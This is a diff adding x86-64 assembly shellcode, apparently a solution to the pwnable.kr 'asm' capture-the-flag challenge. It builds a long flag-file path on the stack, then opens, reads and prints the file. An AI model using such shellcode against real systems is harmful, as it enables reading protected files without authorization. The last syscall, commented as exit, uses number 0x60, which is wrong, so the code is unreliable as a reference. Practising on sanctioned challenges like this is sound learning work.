@@ -1,0 +1,88 @@
+
+global start
+
+start:
+	mov al, 0x02 ; sys_open
+	xor rdi, rdi
+	push rdi
+	mov rdi, qword "0o0o0ong"
+	push rdi
+	mov rdi, qword "0o0o0o0o"
+	push rdi
+	mov rdi, qword "00000000"
+	push rdi
+	mov rdi, qword "ooooo000"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "000000oo"
+	push rdi
+	mov rdi, qword "00000000"
+	push rdi
+	mov rdi, qword "00000000"
+	push rdi
+	mov rdi, qword "ooooo000"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi	
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "oooooooo"
+	push rdi
+	mov rdi, qword "looooooo"
+	push rdi
+	mov rdi, qword "is_very_"
+	push rdi
+	mov rdi, qword "le_name_"
+	push rdi
+	mov rdi, qword "y_the_fi"
+	push rdi
+	mov rdi, qword "ile.sorr"
+	push rdi
+	mov rdi, qword "d_this_f"
+	push rdi
+	mov rdi, qword "ease_rea"
+	push rdi
+	mov rdi, qword "_file_pl"
+	push rdi
+	mov rdi, qword ".kr_flag"
+	push rdi
+	mov rdi, qword "_pwnable"
+	push rdi
+	mov rdi, qword "/this_is"
+	push rdi
+	mov rdi, qword "././././"
+	push rdi
+
+	mov rdi, rsp; const char *filename
+	xor rsi, rsi ; #define	O_RDONLY	0x0000
+	syscall
+
+	mov edi, eax ; unsigned int fd
+	xor al, al ; sys_read
+	mov rsi, rsp ; char *buf
+	mov dl, 0x64; size_t count
+	syscall
+
+	mov al, 0x01 ; sys_write
+	xor rdi, rdi ; stdout
+	add rdi, 0x01
+	syscall
+
+	mov al, 0x60 ; sys_exit
+	xor rdi, rdi
+	syscall
+
+
